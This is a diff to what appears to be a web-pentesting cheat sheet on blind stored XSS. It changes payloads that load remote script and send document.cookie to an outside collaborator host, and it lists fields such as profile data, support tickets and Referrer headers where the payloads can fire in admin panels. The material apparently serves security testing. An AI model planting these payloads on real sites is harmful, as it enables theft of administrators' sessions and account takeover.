@@ -105,11 +105,11 @@ Event handler fuzzing: [PortSwigger XSS cheatsheet](https://portswigger.net/web-
 Store payload; fires in admin/back-office contexts.
 
 ```html
-<script src="//xss.report/c/<id>"></script>
-<img src=x onerror="fetch('//attacker/?c='+document.cookie)">
+<script src="//your-collab.oast.pro/x"></script>
+<img src=x onerror="fetch('//your-collab.oast.pro/?c='+document.cookie)">
 ```
 
-Use XSS Hunter (self-hosted: xsshunter-express) or [h3x0r xsshunter](https://github.com/mandatoryprogrammer/xsshunter-express). Place in:
+Self-host [xsshunter-express](https://github.com/mandatoryprogrammer/xsshunter-express) (mandatoryprogrammer) — original xsshunter.com shut down in 2023. Place payloads in:
 - User profile fields, addresses, company names.
 - Invoice notes, support ticket subjects.
 - Referrer headers (logged in admin dashboards).
